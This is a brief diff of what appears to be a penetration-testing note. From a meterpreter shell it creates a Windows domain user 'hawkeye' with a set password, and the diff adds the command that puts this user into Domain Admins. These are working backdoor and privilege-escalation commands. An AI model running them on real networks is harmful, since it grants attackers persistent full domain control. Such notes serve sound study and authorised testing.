@@ -56,10 +56,10 @@ meterpreter > shell
 
 # adding our user hawkeye
 C:\Windows\system32>net user /add hawkeye Password1@ /domain
+C:\Windows\system32>net group "Domain Admins" hawkeye /ADD /DOMAIN
 ```
 
 #### **Example**
 
 
-![](https://i.imgur.com/oWzcnmn.png)
-
+![](https://i.imgur.com/B2iYLvs.png)
